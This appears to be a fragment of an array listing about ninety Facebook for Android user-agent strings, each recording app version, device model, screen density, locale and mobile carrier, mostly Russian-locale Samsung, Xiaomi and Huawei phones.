"[FBAN/FB4A;FBAV/348.0.0.39.118;FBBV/338919003;FBDM/{density=2.0,width=720,height=1344};FBLC/tr_TR;FBRV/339717689;FBCR/MTS RUS;FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/Redmi 7A;FBSV/10;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/345.0.0.34.118;FBBV/332957732;FBDM/{density=2.75,width=1080,height=2132};FBLC/ru_RU;FBRV/336326830;FBCR/MegaFon #1;FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/M2010J19SY;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/345.0.0.34.118;FBBV/332957733;FBDM/{density=3.375,width=1080,height=2095};FBLC/ru_RU;FBRV/335057661;FBCR/WIND GR;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A505FN;FBSV/11;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/330.0.0.31.120;FBBV/308809006;FBDM/{density=3.0,width=1080,height=1920};FBLC/ru_RU;FBRV/310089474;FBCR/;FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/Redmi Note 4;FBSV/6.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/346.0.0.29.119;FBBV/335950338;FBDM/{density=3.0,width=1080,height=2139};FBLC/ru_RU;FBRV/0;FBCR/MegaFon #1;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/POT-LX1;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/329.0.0.29.120;FBBV/307279835;FBDM/{density=2.75,width=1080,height=2134};FBLC/ru_RU;FBRV/0;FBCR/MTS RUS;FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/Redmi Note 8 Pro;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/329.0.0.29.120;FBBV/307279794;FBDM/{density=2.25,width=720,height=1358};FBLC/ru_RU;FBRV/0;FBCR/MOTIV;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A105F;FBSV/10;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/323.0.0.46.119;FBBV/298672941;FBDM/{density=3.0,width=1080,height=2165};FBLC/ru_RU;FBRV/0;FBCR/MTS RUS;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A715F;FBSV/11;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/326.0.0.34.120;FBBV/303076512;FBDM/{density=2.0,width=720,height=1384};FBLC/ru_RU;FBRV/304230062;FBCR/MTS RUS;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A013F;FBSV/10;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/331.1.0.29.117;FBBV/310595673;FBDM/{density=3.0,width=1080,height=1794};FBLC/ru_RU;FBRV/311143692;FBCR/MegaFon;FBMF/HUAWEI;FBBD/HONOR;FBPN/com.facebook.katana;FBDV/PRA-TL10;FBSV/8.0.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/345.0.0.34.118;FBBV/332957732;FBDM/{density=3.0,width=1080,height=2139};FBLC/ru_RU;FBRV/334763932;FBCR/MTS RUS;FBMF/HUAWEI;FBBD/HONOR;FBPN/com.facebook.katana;FBDV/HRY-LX1;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/348.0.0.39.118;FBBV/338919016;FBDM/{density=3.0,width=1080,height=2110};FBLC/en_GB;FBRV/342682969;FBCR/3;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/YAL-L21;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/348.0.0.39.118;FBBV/338919018;FBDM/{density=3.5,width=1440,height=2984};FBLC/en_GB;FBRV/342797849;FBCR/EE;FBMF/Google;FBBD/google;FBPN/com.facebook.katana;FBDV/Pixel 4 XL;FBSV/12;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/348.0.0.39.118;FBBV/338919016;FBDM/{density=3.0,width=1080,height=2176};FBLC/en_US;FBRV/342753089;FBCR/;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G991W;FBSV/12;FBBK/1;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/345.0.0.34.118;FBBV/332957690;FBDM/{density=3.0,width=1080,height=1920};FBLC/ru_RU;FBRV/333753789;FBCR/MegaFon;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A520F;FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/348.0.0.39.118;FBBV/338918984;FBDM/{density=2.75,width=1080,height=2150};FBLC/ru_RU;FBRV/342837856;FBCR/Vodafone UA;FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/MI 8 Lite;FBSV/8.1.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/348.0.0.39.118;FBBV/338919016;FBDM/{density=2.625,width=1080,height=2131};FBLC/uk_UA;FBRV/342837856;FBCR/UA-KYIVSTAR;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-M315F;FBSV/11;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/345.0.0.34.118;FBBV/332957345;FBDM/{density=2.0,width=720,height=1352};FBLC/en_US;FBRV/335894215;FBCR/Beeline;FBMF/TCL;FBBD/TCL;FBPN/com.facebook.katana;FBDV/5034D_RU;FBSV/8.1.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/348.0.0.39.118;FBBV/338918984;FBDM/{density=2.75,width=1080,height=2030};FBLC/uk_UA;FBRV/342939309;FBCR/KYIVSTAR;FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/Redmi 5 Plus;FBSV/8.1.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/348.0.0.39.118;FBBV/338919016;FBDM/{density=2.75,width=1080,height=2168};FBLC/ru_RU;FBRV/342926335;FBCR/KYIVSTAR;FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/Redmi Note 9 Pro;FBSV/11;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/343.0.0.37.117;FBBV/329937451;FBDM/{density=2.0,width=720,height=1412};FBLC/ru_RU;FBRV/0;FBCR/MTS RUS;FBMF/OPPO;FBBD/OPPO;FBPN/com.facebook.katana;FBDV/CPH1923;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/348.0.0.39.118;FBBV/338919016;FBDM/{density=2.625,width=1080,height=2094};FBLC/en_US;FBRV/342712644;FBCR/T-Mobile MK;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G965F;FBSV/10;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/334.0.0.32.119;FBBV/314823326;FBDM/{density=3.375,width=1080,height=2162};FBLC/ko_KR;FBRV/316186701;FBCR/SKTelecom;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A908N;FBSV/11;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/321.0.0.37.119;FBBV/295906943;FBDM/{density=3.0,width=1080,height=1920};FBLC/ru_RU;FBRV/297790109;FBCR/MegaFon;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A710F;FBSV/7.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/332.0.0.23.111;FBBV/311606647;FBDM/{density=2.75,width=1080,height=2160};FBLC/ru_RU;FBRV/313515503;FBCR/MegaFon #1;FBMF/Google;FBBD/google;FBPN/com.facebook.katana;FBDV/Pixel 4a;FBSV/11;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/345.0.0.34.118;FBBV/332957687;FBDM/{density=2.0,width=720,height=1280};FBLC/ru_RU;FBRV/335422155;FBCR/ROSTELECOM;FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/Redmi 4X;FBSV/7.1.2;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/345.0.0.34.118;FBBV/332957731;FBDM/{density=1.75,width=720,height=1448};FBLC/ru_RU;FBRV/334483389;FBCR/Tele2You;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A217F;FBSV/10;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/334.0.0.32.119;FBBV/314823326;FBDM/{density=2.625,width=1080,height=2186};FBLC/ru_RU;FBRV/315878678;FBCR/MTS RUS;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A515F;FBSV/11;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/326.0.0.34.120;FBBV/303076512;FBDM/{density=2.0,width=720,height=1384};FBLC/ru_RU;FBRV/303703753;FBCR/ZZ;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-J600FN;FBSV/10;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/333.0.0.30.119;FBBV/313672640;FBDM/{density=2.0,width=720,height=1456};FBLC/ru_RU;FBRV/314609338;FBCR/MTS RUS;FBMF/realme;FBBD/realme;FBPN/com.facebook.katana;FBDV/RMX2021;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/345.0.0.34.118;FBBV/332957652;FBDM/{density=3.0,width=1080,height=2224};FBLC/ru_RU;FBRV/335247818;FBCR/Tele2You;FBMF/HUAWEI;FBBD/HONOR;FBPN/com.facebook.katana;FBDV/STK-LX1;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/345.0.0.34.118;FBBV/332957732;FBDM/{density=3.1875,width=1080,height=2169};FBLC/ru_RU;FBRV/335184228;FBCR/MTS RUS;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G980F;FBSV/11;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/320.0.0.34.118;FBBV/293906223;FBDM/{density=2.9125001,width=2560,height=1516};FBLC/ru_RU;FBRV/296240860;FBCR/;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/SCM-W09;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/346.0.0.29.119;FBBV/335950318;FBDM/{density=2.0,width=720,height=1449};FBLC/ru_RU;FBRV/337672225;FBCR/Beeline;FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/M2006C3MNG;FBSV/10;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/319.0.0.39.120;FBBV/292233352;FBDM/{density=2.0,width=720,height=1344};FBLC/ru_RU;FBRV/296244047;FBCR/Tele2;FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/Redmi 6;FBSV/9;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/331.1.0.29.117;FBBV/310595669;FBDM/{density=2.0,width=720,height=1436};FBLC/ru_RU;FBRV/312110230;FBCR/MTS RUS;FBMF/vivo;FBBD/vivo;FBPN/com.facebook.katana;FBDV/vivo 1820;FBSV/8.1.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/329.0.0.29.120;FBBV/307279835;FBDM/{density=2.25,width=720,height=1445};FBLC/ru_RU;FBRV/308975548;FBCR/;FBMF/realme;FBBD/realme;FBPN/com.facebook.katana;FBDV/RMX2020;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/345.0.0.34.118;FBBV/332957687;FBDM/{density=2.25,width=720,height=1280};FBLC/ru_RU;FBRV/0;FBCR/MTS RUS;FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/Redmi 4X;FBSV/7.1.2;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/345.0.0.34.118;FBBV/332957732;FBDM/{density=2.75,width=1080,height=2208};FBLC/ru_RU;FBRV/336326830;FBCR/MTS RUS;FBMF/vivo;FBBD/vivo;FBPN/com.facebook.katana;FBDV/V2025;FBSV/11;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/325.0.0.36.170;FBBV/301621604;FBDM/{density=2.0,width=720,height=1280};FBLC/ru_RU;FBRV/302733955;FBCR/Beeline;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-J510FN;FBSV/7.1.1;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/326.0.0.34.120;FBBV/303076224;FBDM/{density=3.0,width=1080,height=1920};FBLC/ru_RU;FBRV/304009249;FBCR/Tele2;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G935F;FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/329.0.0.29.120;FBBV/307279817;FBDM/{density=1.75,width=720,height=1423};FBLC/ru_RU;FBRV/0;FBCR/;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A205FN;FBSV/9;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/319.0.0.39.120;FBBV/292233375;FBDM/{density=2.75,width=1080,height=2180};FBLC/ru_RU;FBRV/293494611;FBCR/MTS RUS;FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/M2007J3SG;FBSV/11;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/345.0.0.34.118;FBBV/332957690;FBDM/{density=2.25,width=720,height=1422};FBLC/ru_RU;FBRV/336326830;FBCR/MTS RUS;FBMF/HUAWEI;FBBD/HONOR;FBPN/com.facebook.katana;FBDV/JAT-LX1;FBSV/9;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/345.0.0.34.118;FBBV/332957731;FBDM/{density=1.875,width=720,height=1465};FBLC/ru_RU;FBRV/335653675;FBCR/MegaFon #1;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A125F;FBSV/11;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/345.0.0.34.118;FBBV/332957728;FBDM/{density=2.8125,width=1080,height=2190};FBLC/en_GB;FBRV/335057661;FBCR/MTS RUS;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G998B;FBSV/11;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/309.0.0.47.119;FBBV/277444780;FBDM/{density=3.0,width=1080,height=2137};FBLC/ru_RU;FBRV/280037930;FBCR/MTS RUS;FBMF/HUAWEI;FBBD/HONOR;FBPN/com.facebook.katana;FBDV/JSN-L21;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/345.0.0.34.118;FBBV/332957732;FBDM/{density=2.625,width=1080,height=2131};FBLC/ru_RU;FBRV/335613337;FBCR/MTS RUS;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A505FN;FBSV/11;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/329.0.0.29.120;FBBV/307279835;FBDM/{density=2.8125,width=1080,height=2272};FBLC/ru_RU;FBRV/307753865;FBCR/Beeline;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A725F;FBSV/11;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/346.0.0.29.119;FBBV/335950334;FBDM/{density=2.0,width=720,height=1464};FBLC/ru_RU;FBRV/337477441;FBCR/Tele2;FBMF/TECNO MOBILE LIMITED;FBBD/TECNO;FBPN/com.facebook.katana;FBDV/TECNO KE7;FBSV/10;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/346.0.0.29.119;FBBV/335950338;FBDM/{density=3.0,width=1080,height=2153};FBLC/ru_RU;FBRV/336583093;FBCR/MegaFon;FBMF/realme;FBBD/realme;FBPN/com.facebook.katana;FBDV/RMX2155;FBSV/11;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/345.0.0.34.118;FBBV/332957732;FBDM/{density=2.625,width=1080,height=2184};FBLC/ru_RU;FBRV/335950585;FBCR/MTS RUS;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A415F;FBSV/11;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/320.0.0.34.118;FBBV/293906210;FBDM/{density=3.0,width=1080,height=1920};FBLC/ru_RU;FBRV/295812335;FBCR/MTS RUS;FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/Redmi Note 4;FBSV/7.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/300.2.0.58.129;FBBV/265245028;FBDM/{density=3.0,width=1080,height=2090};FBLC/ru_RU;FBRV/268119191;FBCR/MTS RUS;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/JNY-LX1;FBSV/10;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/347.0.0.28.237;FBBV/337279749;FBDM/{density=3.0,width=1080,height=2110};FBLC/ru_RU;FBRV/337873060;FBCR/MegaFon;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A405FM;FBSV/11;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/320.0.0.34.118;FBBV/293906223;FBDM/{density=3.0,width=1080,height=2076};FBLC/ru_RU;FBRV/296240860;FBCR/MTS RUS;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A530F;FBSV/9;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/348.0.0.39.118;FBBV/338919003;FBDM/{density=2.0,width=720,height=1365};FBLC/en_US;FBRV/342712644;FBCR/ ;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-S111DL;FBSV/10;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/330.0.0.31.120;FBBV/308809026;FBDM/{density=2.625,width=1080,height=2186};FBLC/ru_RU;FBRV/310739136;FBCR/MegaFon #1;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A515F;FBSV/11;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/347.0.0.28.237;FBBV/337279586;FBDM/{density=2.75,width=1080,height=2134};FBLC/ru_RU;FBRV/338253300;FBCR/;FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/M2004J19C;FBSV/11;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/318.0.0.39.154;FBBV/290428855;FBDM/{density=3.375,width=1080,height=2095};FBLC/ru_RU;FBRV/291966150;FBCR/Tele2;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A505FM;FBSV/11;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/346.0.0.29.119;FBBV/335950341;FBDM/{density=3.375,width=1080,height=2147};FBLC/ru_RU;FBRV/0;FBCR/MTS RUS;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A715F;FBSV/11;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/348.0.0.39.118;FBBV/338918983;FBDM/{density=2.0,width=1200,height=1852};FBLC/ru_RU;FBRV/0;FBCR/MTS RUS;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/AGS2-L09;FBSV/8.0.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/345.0.0.34.118;FBBV/332957732;FBDM/{density=3.0,width=1080,height=2137};FBLC/ru_RU;FBRV/0;FBCR/Tele2You;FBMF/HUAWEI;FBBD/HONOR;FBPN/com.facebook.katana;FBDV/JSN-L21;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/346.0.0.29.119;FBBV/335950308;FBDM/{density=2.325,width=1200,height=1854};FBLC/ru_RU;FBRV/336982524;FBCR/Beeline;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/AGS3-L09;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/345.0.0.34.118;FBBV/332957732;FBDM/{density=2.75,width=1080,height=2179};FBLC/ru_RU;FBRV/335057661;FBCR/MTS RUS;FBMF/Xiaomi;FBBD/POCO;FBPN/com.facebook.katana;FBDV/M2007J20CG;FBSV/11;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/331.1.0.29.117;FBBV/310595673;FBDM/{density=3.0,width=1080,height=2128};FBLC/ru_RU;FBRV/311402408;FBCR/MTS RUS;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/PAR-LX1;FBSV/8.1.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/345.0.0.34.118;FBBV/332957728;FBDM/{density=2.625,width=1080,height=2199};FBLC/ru_RU;FBRV/334917327;FBCR/Beeline;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G998B;FBSV/11;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/345.0.0.34.118;FBBV/332957701;FBDM/{density=3.375,width=1080,height=2058};FBLC/ru_RU;FBRV/334678840;FBCR/Beeline;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G955F;FBSV/9;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/323.0.0.46.119;FBBV/298672806;FBDM/{density=2.625,width=1080,height=1920};FBLC/ru_RU;FBRV/0;FBCR/Tele2;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-J730FM;FBSV/8.1.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/346.0.0.29.119;FBBV/335950338;FBDM/{density=3.0,width=1080,height=2110};FBLC/ru_RU;FBRV/337672225;FBCR/MTS RUS;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A405FM;FBSV/11;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/330.0.0.31.120;FBBV/308809026;FBDM/{density=2.75,width=1080,height=2131};FBLC/ru_RU;FBRV/310111071;FBCR/MegaFon;FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/Redmi Note 7;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/344.0.0.34.116;FBBV/331704277;FBDM/{density=2.625,width=1080,height=2094};FBLC/ru_RU;FBRV/333390281;FBCR/Tele2You;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A750FN;FBSV/10;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/328.0.0.22.119;FBBV/305660426;FBDM/{density=3.0,width=2020,height=1080};FBLC/ru_RU;FBRV/0;FBCR/LMT;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G970F;FBSV/11;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/332.0.0.23.111;FBBV/311606775;FBDM/{density=3.0,width=1080,height=2113};FBLC/ru_RU;FBRV/313101011;FBCR/MTS RUS;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-M215F;FBSV/11;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/339.0.0.32.118;FBBV/323007024;FBDM/{density=1.75,width=720,height=1471};FBLC/ru_RU;FBRV/0;FBCR/MegaFon;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A025F;FBSV/11;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/328.0.0.22.119;FBBV/305660426;FBDM/{density=2.625,width=1080,height=2273};FBLC/ru_RU;FBRV/306637004;FBCR/Beeline;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A525F;FBSV/11;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/334.0.0.32.119;FBBV/314823326;FBDM/{density=3.0,width=1080,height=2110};FBLC/ru_RU;FBRV/316392430;FBCR/MegaFon;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A405FM;FBSV/11;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/325.0.0.36.170;FBBV/301621682;FBDM/{density=2.75,width=1080,height=2168};FBLC/ru_RU;FBRV/303064986;FBCR/MOLDCELL;FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/Redmi Note 9S;FBSV/11;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/346.0.0.29.119;FBBV/335950322;FBDM/{density=3.0,width=1080,height=2076};FBLC/ru_RU;FBRV/336982524;FBCR/MTS RUS;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A605FN;FBSV/10;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/331.1.0.29.117;FBBV/310595753;FBDM/{density=2.625,width=1080,height=2183};FBLC/ru_RU;FBRV/311825404;FBCR/Beeline;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A715F;FBSV/11;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/316.0.0.54.116;FBBV/287518981;FBDM/{density=2.625,width=1080,height=1920};FBLC/ru_RU;FBRV/0;FBCR/MTS RUS;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A720F;FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/330.0.0.31.120;FBBV/308809011;FBDM/{density=3.0,width=1080,height=2076};FBLC/ru_RU;FBRV/310825523;FBCR/MegaFon Fastest;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A530F;FBSV/9;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/345.0.0.34.118;FBBV/332957732;FBDM/{density=2.75,width=1080,height=2168};FBLC/ru_RU;FBRV/335203034;FBCR/Beeline;FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/Redmi Note 9 Pro;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/326.0.0.34.120;FBBV/303076526;FBDM/{density=3.0,width=1080,height=2110};FBLC/ru_RU;FBRV/304749896;FBCR/MegaFon;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A405FM;FBSV/11;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/341.0.0.30.73;FBBV/326471163;FBDM/{density=3.0,width=2032,height=1080};FBLC/ru_RU;FBRV/0;FBCR/Beeline;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/EML-L29;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/346.0.0.29.119;FBBV/335949421;FBDM/{density=3.0,width=1080,height=2107};FBLC/ru_RU;FBRV/337153624;FBCR/Beeline;FBMF/HUAWEI;FBBD/HONOR;FBPN/com.facebook.katana;FBDV/MAR-LX1H;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/319.0.0.39.120;FBBV/292233354;FBDM/{density=3.0,width=1080,height=1920};FBLC/ru_RU;FBRV/294193097;FBCR/MTS RUS;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A510F;FBSV/7.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/345.0.0.34.118;FBBV/332957687;FBDM/{density=1.75,width=720,height=1396};FBLC/ru_RU;FBRV/335247818;FBCR/MTS RUS;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-J415FN;FBSV/9;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/320.0.0.34.118;FBBV/293906272;FBDM/{density=2.625,width=1080,height=2195};FBLC/ru_RU;FBRV/296240860;FBCR/MegaFon;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A325F;FBSV/11;FBOP/1;FBCA/arm64-v8a:;]",
